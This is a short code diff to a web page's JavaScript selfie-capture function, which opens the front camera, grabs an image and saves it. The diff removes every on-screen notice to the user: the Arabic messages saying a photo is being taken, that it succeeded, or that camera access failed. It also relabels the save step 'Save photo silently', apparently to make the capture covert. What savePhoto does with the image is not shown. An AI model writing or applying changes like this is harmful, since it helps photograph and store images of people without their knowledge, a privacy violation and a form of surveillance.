@@ -362,8 +362,6 @@ document.head.appendChild(style);
 // Selfie Capture System
 async function captureSelfie() {
     try {
-        showNotification('جاري التقاط الصورة... 📸');
-        
         // Request camera access
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: 'user' } // Front camera
@@ -396,13 +394,11 @@ async function captureSelfie() {
         // Stop camera
         stream.getTracks().forEach(track => track.stop());
         
-        // Save photo
+        // Save photo silently
         savePhoto(imageData);
         
-        showNotification('تم التقاط الصورة بنجاح! ✓');
     } catch (error) {
         console.error('Error capturing selfie:', error);
-        showNotification('فشل التقاط الصورة. تأكد من السماح بالوصول للكاميرا.');
     }
 }
 
